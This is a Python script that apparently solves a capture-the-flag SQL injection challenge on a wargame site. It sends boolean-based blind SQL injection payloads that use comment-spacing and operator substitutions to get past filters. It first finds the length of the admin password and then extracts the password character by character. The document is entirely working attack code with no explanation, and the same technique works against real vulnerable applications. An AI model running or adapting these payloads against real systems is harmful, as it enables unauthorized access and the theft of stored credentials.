import requests, string

cookies = { "PHPSESSID": "mb1phjh2magaoc9qipl63b4gs6" }

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"

password_length = 0

success_text = "Hello admin"

for i in range(1,32):
  payload = '1/**/||/**/id/**/in/**/("admin")/**/&&/**/length(pw)<>%s' % (str(i))
  params = {"pw": "pw", "no": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text not in r.text:
    print("Admin Password length is %s" % (str(i)))
    password_length = i
    break

password = ""

for i in range(1, password_length+1):
  for c in string.printable:
    payload = '1/**/||/**/id/**/in/**/("admin")/**/&&/**/mid(pw,{offset},1)<>"{character}"'.format(offset=i, character=c)
    params = { "pw": "pw", "no": payload }
    r = requests.get(url, params=params, cookies=cookies)
    if success_text not in r.text:
      password += c
      print(password)
      break